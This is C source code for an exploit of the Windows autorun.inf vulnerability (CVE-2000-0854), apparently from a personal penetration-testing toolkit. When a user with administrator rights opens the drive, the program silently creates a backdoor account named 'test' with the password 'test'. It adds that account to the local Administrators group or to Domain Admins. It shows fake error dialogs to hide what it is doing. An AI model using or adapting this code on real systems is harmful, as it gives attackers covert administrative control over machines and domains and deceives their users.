/* XXX - PRIVATE CODE - XXX
 * 
 * Copyrightï¿½ 2000-2008 Nelson Brito.
 * This file is part of Penetration Test Toolkit by Nelson Brito.

   License, Distribution and Warranty:
   (1) This code is *CONFIDENCIAL, PROPRIETARY and PROTECTED*  from disclosure. 
       Needs to be notified  to Nelson Brito, in the case of this code is being 
       distributed or published in any way.
 
   (2) You *DO NOT* have permission to use this code in a commercial product or 
       commercial consulting.
	  
   (3) This code is provided as open source but *IS NOT LICENSED* under the GPL
       or other common open source licenses. This code *MAY NOT BE* re-licensed
	   without the explicit, written permission of Nelson Brito.

   (4) This software is provided AS-IS with no warranty expressed or implied.
   
   (5) The Copyright holder *IS NOT* liable for any costs associated with using
       this software.

   (6) This code, or portions of it, *MAY NOT BE* incorporated into other codes
       without the explicit, written permission of Nelson Brito.

 * XXX - PRIVATE CODE - XXX */
#ifndef __AUTORUN_CPP
#define __AUTORUN_CPP 1

#ifndef UNICODE 
#define UNICODE 1
#endif  /* UNICODE */

/* Author:    Nelson Brito <nbrito@sekure.org>
   Revisions: December 9th, 2000
			  February 13rd, 2001
			  April 6th, 2001
			  October 14th, 2008 */
#include <stdio.h>
#include <windows.h>
#include <wchar.h>
#include <lmaccess.h>
#include <lm.h>
#include <winbase.h>

/* XXX - FURTHER INFORMATION - XXX
 * 
 * Title:		Microsoft Windows autorun.inf Vulnerability
 * Bugtraq ID:	993
   CVE:			CVE-2000-0854
   Microsoft:	UNASSIGNED
   X-Force:		nt-autorun-notdefault (1274)


[References]
   This vulnerability was discovered by Eric Stevens <ejsteven@cs.millersv.edu>.

   Some interesting URLs:
   http://seclists.org/bugtraq/2000/Feb/0305.html
   http://seclists.org/bugtraq/2001/Feb/0174.html
   http://www.securityfocus.com/bid/993
   http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0155
   http://xforce.iss.net/xforce/xfdb/1274


[Vulnerability details]
   The Windows Autorun feature was designed to allow an executable and an icon to
   be specified for any piece of removable media. 
   
   Upon insertion, the icon would be displayed for the drive, and the executable 
   would automatically run. This feature also applies to fixed and networked drives
   however, making it much easier to abuse. 
   
   Any user with write access to the root of a logical drive can install an executable
   and specify it in an autorun.inf file. Anytime that drive is accessed later, the 
   code will run with the privileges of the currently logged in user. 
   
   This could be used in privilege escalation attacks.

 * XXX - FURTHER INFORMATION - XXX */
#pragma hdrstop 
#pragma comment(lib, "netapi32") 

/* Routine to find the Primary DC server's name in the Network.
   Returns the PDC Server Name or NULL if there is no Primary DC. */
LPWSTR FindPrimaryDC(LPWSTR L_MACHINE){ 
	NET_API_STATUS NAPIS;
	LPBYTE PRIMARY_DC, F_STAT;

	NAPIS = NetGetDCName(L_MACHINE, NULL, &PRIMARY_DC); 

	if(NAPIS != NERR_Success || PRIMARY_DC == NULL) 
		return(NULL);

	F_STAT = PRIMARY_DC;

	NetApiBufferFree(PRIMARY_DC);

	return((LPWSTR)F_STAT); 
}

/* Routine to verify if the current user is member of Administrators Group.
   Returns TRUE or FALSE. */ 
BOOL CurrUserAdminStatus(wchar_t * U_NAME, wchar_t * PRIMARY_DC){ 
	BOOL F_STAT; 
	USER_INFO_1 *UI; 

	if(NetUserGetInfo(PRIMARY_DC, U_NAME, 1, (BYTE **) &UI) != NERR_Success) 
		return(FALSE); 

	if(UI->usri1_priv == USER_PRIV_ADMIN)
		F_STAT = TRUE;
	else
		F_STAT = FALSE;

	NetApiBufferFree(UI);

	return(F_STAT);
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow){
 	wchar_t			U_NAME[256];
	LPWSTR			PRIMARY_DC;
	DWORD			SZ_U_NAME	= sizeof(U_NAME);
	/* The USER_INFO_1 structure specifies information about an user account.
	   It could be much more specific using structures like: USER_INFO_22. */
	USER_INFO_1     UI;
	NET_API_STATUS	N_STAT		= 0;
	LPWSTR			NBRITO		= TEXT("test");
	DWORD			USER_LEVEL	= 1;
	DWORD			PARM_ERR	= 0;
	DWORD			GROUP_LEVEL	= 3;
	DWORD			TOTAL_ENT	= 1;

	/* Setting the information for user account "nbrito". */
	UI.usri1_name				= NBRITO;
	UI.usri1_password			= NBRITO;
	/* "For the NetUserAdd function, this member must be USER_PRIV_USER." */
	UI.usri1_priv				= USER_PRIV_USER;
	UI.usri1_home_dir			= NULL;
	UI.usri1_comment			= TEXT("Nelson Brito");
	UI.usri1_flags				= UF_SCRIPT;
	UI.usri1_script_path		= NULL;

	PRIMARY_DC = FindPrimaryDC(NULL);
	/* Find the current user name. */
	GetUserNameW(U_NAME, &SZ_U_NAME);

	switch(CurrUserAdminStatus(U_NAME, (LPWSTR)PRIMARY_DC)){
	/* Tests if the current user name has administrator's privilege. */
		case TRUE:
			MessageBox(NULL, TEXT("Error trying to open a file. Invalid memory access @ 0xdeadbeef."), TEXT("Warning!"), MB_OK|MB_SETFOREGROUND|MB_ICONSTOP);

			/* Just add the user account on the server.But it can be more sophisticated, such as:
			   - If the user already exists, the privileges can be changed to escalate;
			   - If the user already exists, the password can be changed;
			   - Etc... */
			N_STAT = NetUserAdd(PRIMARY_DC, USER_LEVEL, (LPBYTE)&UI, &PARM_ERR);

			if(N_STAT != NERR_Success)
				exit(EXIT_FAILURE);

			/* Testing if there is a Primary DC server.
					
			   XXX Here is some gotchas XXX
			   (1) If the FindPrimaryDC() returns NULL it means that there is no Primary
			       DC in the network, and the user can only be added to Administrators.

			   (2) If the FindPrimaryDC() returns any value it means that there is a PDC
			       in the network, and the user can be added to Domain Admins. */

			/* Case (1) - Stand-alone Server. */
			if(PRIMARY_DC == NULL){

				N_STAT = NetLocalGroupAddMembers(PRIMARY_DC, TEXT("Administrators"), GROUP_LEVEL, (LPBYTE)&UI, TOTAL_ENT);

				if(N_STAT != NERR_Success)
					exit(EXIT_FAILURE);

			/* Case (2) - Primary Domain Controller Server. */
			} else {

				N_STAT = NetGroupAddUser(PRIMARY_DC, TEXT("Domain Admins"), NBRITO);

				if(N_STAT != NERR_Success)
					exit(EXIT_FAILURE);

			}
			break; 

		case FALSE: 
			MessageBox(NULL, TEXT("Error trying to open a corrupted file, please report this error message to your Administrator"), TEXT("Error!"), MB_OK|MB_SETFOREGROUND|MB_ICONSTOP);
			break; 

	}


	return(EXIT_SUCCESS);
}
#endif  /* __AUTORUN_CPP */
